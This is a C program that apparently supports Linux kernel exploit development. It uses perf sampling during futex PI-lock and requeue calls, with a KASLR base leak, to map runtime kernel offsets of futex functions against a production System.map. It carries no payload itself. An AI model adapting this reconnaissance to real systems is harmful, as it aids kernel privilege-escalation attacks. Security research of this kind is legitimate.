/* futex_perf.c — sample kernel IP/callchain during futex ops, histogram
 * (ip - _text_runtime). Safe (no UAF: plain requeue + uncontended PI). */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <linux/perf_event.h>
#include "kaaslr.h"

#ifndef __NR_perf_event_open
#define __NR_perf_event_open 241
#endif
#define RP 16
#define MAXO 400000

static uint64_t offs[MAXO]; static int no;

static void drain(void *base,size_t pg,size_t ds,struct perf_event_mmap_page *meta,uint64_t kt){
    char *d=(char*)base+pg; __sync_synchronize();
    uint64_t head=meta->data_head;
    while(meta->data_tail<head){
        struct perf_event_header *h=(void*)(d+(meta->data_tail%ds));
        if(h->size<sizeof(*h)){meta->data_tail=head;break;}
        if(h->type==PERF_RECORD_SAMPLE){
            char *q=(char*)h+sizeof(*h);
            uint64_t ip; memcpy(&ip,q,8); q+=8;
            uint64_t nr; memcpy(&nr,q,8); q+=8;
            if(ip>=0xffff000000000000UL && no<MAXO) offs[no++]=ip-kt;
            if(nr>64) nr=64;
            for(uint64_t k=0;k<nr;k++){ uint64_t c; memcpy(&c,q,8); q+=8;
                if(c>=0xffff000000000000UL && no<MAXO) offs[no++]=c-kt; }
        }
        meta->data_tail+=h->size;
    }
}
static int cmp(const void*a,const void*b){uint64_t x=*(uint64_t*)a,y=*(uint64_t*)b;return x<y?-1:x>y?1:0;}
static inline long xf(void*u,int op,int v,void*t,void*u2,int v3){ return syscall(98,u,op,v,t,u2,v3); }

int main(void){
    setvbuf(stdout,NULL,_IONBF,0);
    uint64_t kt=kaaslr_text_base();
    printf("[*] _text_runtime = %#018llx\n",(unsigned long long)kt);
    if(!kt){ printf("[!] no KASLR leak\n"); return 1; }

    struct perf_event_attr a; memset(&a,0,sizeof(a));
    a.type=PERF_TYPE_HARDWARE; a.size=sizeof(a); a.config=PERF_COUNT_HW_INSTRUCTIONS;
    a.sample_type=PERF_SAMPLE_IP|PERF_SAMPLE_CALLCHAIN; a.sample_period=3000;
    a.disabled=1; a.exclude_kernel=0; a.exclude_hv=1; a.wakeup_events=1;
    int fd=(int)syscall(__NR_perf_event_open,&a,0,-1,-1,0);
    if(fd<0){ printf("[!] perf errno=%d %s\n",errno,strerror(errno)); return 1; }
    size_t pg=sysconf(_SC_PAGESIZE), ds=RP*pg, ms=ds+pg;
    void *base=mmap(NULL,ms,PROT_READ|PROT_WRITE,MAP_SHARED,fd,0);
    if(base==MAP_FAILED){ printf("[!] mmap errno=%d\n",errno); return 1; }
    struct perf_event_mmap_page *meta=base;
    ioctl(fd,PERF_EVENT_IOC_RESET,0); ioctl(fd,PERF_EVENT_IOC_ENABLE,0);

    uint32_t f1=0,f2=0;
    for(long i=0;i<400000 && no<MAXO;i++){
        xf(&f1,6|128,0,0,0,0);      /* LOCK_PI */
        xf(&f1,7|128,0,0,0,0);      /* UNLOCK_PI */
        xf(&f1,3|128,1,0,&f2,0);    /* REQUEUE (plain) */
        if((i&0x3ff)==0) drain(base,pg,ds,meta,kt);
    }
    drain(base,pg,ds,meta,kt);
    ioctl(fd,PERF_EVENT_IOC_DISABLE,0); munmap(base,ms); close(fd);
    printf("[*] offsets collected: %d\n",no);
    if(!no) return 1;
    qsort(offs,no,sizeof(uint64_t),cmp);
    /* hit counts within function ranges from our production System.map */
    {
        struct { unsigned lo, hi; const char *nm; } R[] = {
            {0x29d768,0x29f490,"do_futex"},
            {0x29fbf8,0x2a100c,"futex_requeue"},
            {0x2a107c,0x2a1bfc,"futex_lock_pi"},
            {0x1531c14,0x1532e20,"rt_mutex_adjust_prio_chain"},
            {0x11470,0x11780,"el0t_64_sync"},
        };
        for (unsigned r=0;r<sizeof(R)/sizeof(R[0]);r++){
            int c=0; uint64_t mn=~0ull, mx=0;
            for(int i=0;i<no;i++) if(offs[i]>=R[r].lo && offs[i]<R[r].hi){ c++; if(offs[i]<mn)mn=offs[i]; if(offs[i]>mx)mx=offs[i]; }
            printf("HIT %-28s count=%-7d", R[r].nm, c);
            if(c) printf(" range=[%#x..%#x]", (unsigned)mn, (unsigned)mx);
            printf("\n");
        }
    }
    /* print top offsets by count within 0x200000..0x400000 (futex area) */
    {
        static uint64_t uo[8000]; static int uc[8000]; int nu=0;
        for(int i=0;i<no;){
            uint64_t v=offs[i]; int c=1,j=i+1; while(j<no && offs[j]==v){c++;j++;}
            if(v>=0x200000UL && v<0x400000UL && nu<8000){ uo[nu]=v; uc[nu]=c; nu++; }
            i=j;
        }
        printf("=== top offsets in 0x200000..0x400000 (futex area) ===\n");
        for(int t=0;t<25;t++){
            int best=-1;
            for(int k=0;k<nu;k++) if(uc[k]>0 && (best<0 || uc[k]>uc[best])) best=k;
            if(best<0) break;
            printf("%#010x x%d\n",(unsigned)uo[best],uc[best]);
            uc[best]=0;
        }
    }
    /* print runs (offset:count) for offsets that look like .text (<0x3000000) */
    int shown=0;
    for(int i=0;i<no && shown<60;){
        uint64_t v=offs[i]; int c=1; int j=i+1;
        while(j<no && offs[j]==v){c++;j++;}
        if(v<0x3000000UL){ printf("%#010llx x%d\n",(unsigned long long)v,c); shown++; }
        i=j;
    }
    return 0;
}
